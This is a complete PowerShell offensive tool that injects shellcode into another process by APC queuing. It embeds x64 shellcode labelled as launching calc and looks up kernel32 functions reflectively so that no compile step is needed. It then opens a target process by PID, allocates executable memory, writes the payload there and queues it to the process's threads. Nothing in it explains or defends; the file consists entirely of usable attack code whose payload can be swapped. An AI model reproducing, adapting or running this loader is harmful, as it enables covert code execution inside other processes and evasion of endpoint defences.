#shellcode to be injected - currently pop calc
$shellcode = [Byte[]] (0x48,0x31,0xff,0x48,0xf7,0xe7,0x65,0x48,0x8b,0x58,0x60,0x48,0x8b,0x5b,0x18,0x48,0x8b,0x5b,0x20,0x48,0x8b,0x1b,0x48,0x8b,0x1b,0x48,0x8b,0x5b,0x20,0x49,0x89,0xd8,0x8b,0x5b,0x3c,0x4c,0x01,0xc3,0x48,0x31,0xc9,0x66,0x81,0xc1,0xff,0x88,0x48,0xc1,0xe9,0x08,0x8b,0x14,0x0b,0x4c,0x01,0xc2,0x4d,0x31,0xd2,0x44,0x8b,0x52,0x1c,0x4d,0x01,0xc2,0x4d,0x31,0xdb,0x44,0x8b,0x5a,0x20,0x4d,0x01,0xc3,0x4d,0x31,0xe4,0x44,0x8b,0x62,0x24,0x4d,0x01,0xc4,0xeb,0x32,0x5b,0x59,0x48,0x31,0xc0,0x48,0x89,0xe2,0x51,0x48,0x8b,0x0c,0x24,0x48,0x31,0xff,0x41,0x8b,0x3c,0x83,0x4c,0x01,0xc7,0x48,0x89,0xd6,0xf3,0xa6,0x74,0x05,0x48,0xff,0xc0,0xeb,0xe6,0x59,0x66,0x41,0x8b,0x04,0x44,0x41,0x8b,0x04,0x82,0x4c,0x01,0xc0,0x53,0xc3,0x48,0x31,0xc9,0x80,0xc1,0x07,0x48,0xb8,0x0f,0xa8,0x96,0x91,0xba,0x87,0x9a,0x9c,0x48,0xf7,0xd0,0x48,0xc1,0xe8,0x08,0x50,0x51,0xe8,0xb0,0xff,0xff,0xff,0x49,0x89,0xc6,0x48,0x31,0xc9,0x48,0xf7,0xe1,0x50,0x48,0xb8,0x9c,0x9e,0x93,0x9c,0xd1,0x9a,0x87,0x9a,0x48,0xf7,0xd0,0x50,0x48,0x89,0xe1,0x48,0xff,0xc2,0x48,0x83,0xec,0x20,0x41,0xff,0xd6)

#use native methods to lookup function addresses

function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$_}} 
    $handle = $assem.GetMethod('GetModuleHandle').Invoke($null, @($moduleName));
    [IntPtr] $result = 0;
    try {
        $result = $tmp[0].Invoke($null, @($handle, $functionName));
    }catch {
        $handle = new-object -TypeName System.Runtime.InteropServices.HandleRef -ArgumentList @($null, $handle);
        $result = $tmp[0].Invoke($null, @($handle, $functionName));
    }
    return $result;
}

function getDelegateType {
    Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,[Parameter(Position = 1)] [Type] $delType = [Void])
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType','Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType() 
}

#take command line argument as target process
$targetPID = [UInt32]$args[0]


#define necessary access rights for process
$PROCESS_VM_OPERATION = 0x0008
$PROCESS_VM_READ = 0x0010
$PROCESS_VM_WRITE = 0x0020
$PROCESS_CREATE_THREAD = 0x0002
$PROCESS_QUERY_INFO = 0x0400
$access = $PROCESS_VM_OPERATION -bor $PROCESS_VM_READ -bor $PROCESS_VM_WRITE -bor $PROCESS_CREATE_THREAD -bor $PROCESS_QUERY_INFO

#open target process
$hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess),(getDelegateType @([UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke($access, 0, $targetPID)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Host "Open process Failed"
    }
else {
    Write-Host "Handle to process: $hProcess"
}

#allocate memory in target process
$addr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx),(getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
if ($addr -eq [IntPtr]::Zero) {
    Write-Host "Virtual alloc Failed"
    }
else {
    Write-Host "Allocated memory at address: $addr"
}

#write shellcode to allocated memory
$result = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory),(getDelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr])([Bool]))).Invoke($hProcess, $addr, $shellcode, $shellcode.Length, [IntPtr]::Zero)
if ($result -eq $false) {
    Write-Host "Write process memory Failed"
    }
else {
    Write-Host "Wrote shellcode to target process"
}   

#define necessary access rights for threads
$THREAD_SET_CONTEXT = 0x0010
$THREAD_SUSPEND_RESUME = 0x0002
$THREAD_QUERY_INFORMATION = 0x0040
$access = $THREAD_SET_CONTEXT -bor $THREAD_SUSPEND_RESUME -bor $THREAD_QUERY_INFORMATION

#get a process object for target PID and iterate through its threads
$proc = [System.Diagnostics.Process]::GetProcessById($targetPID)
foreach ($thread in $proc.Threads){
    #open thread
    $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenThread),(getDelegateType @([UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke($access, 0, $thread.id)
    if ($hThread -eq [IntPtr]::Zero){
        Write-Host "Open Thread Failed"
    }
    else {
        Write-Host "Handle to thread: $hThread"
    }
    #queue APC to thread
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll QueueUserAPC),(getDelegateType @([IntPtr], [IntPtr], [UInt32])([UInt32]))).Invoke($addr, $hThread, 0)
    if ($result -eq 0) {
        Write-Host "Queue APC Failed"
    }
    else {
        Write-Host "Queued APC to thread"
    }
    #resume thread
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll ResumeThread),(getDelegateType @([IntPtr])([IntPtr]))).Invoke($hThread)
    if ($result -eq [IntPtr]::Zero) {
        Write-Host "Resume Thread Failed"
    }
    else {
        Write-Host "Resumed thread"
        #break or it runs more than once
        break
    }
    #[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CloseHandle),(getDelegateType @([IntPtr])([Bool]))).Invoke($hThread)
}
#[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CloseHandle),(getDelegateType @([IntPtr])([Bool]))).Invoke($hProcess)
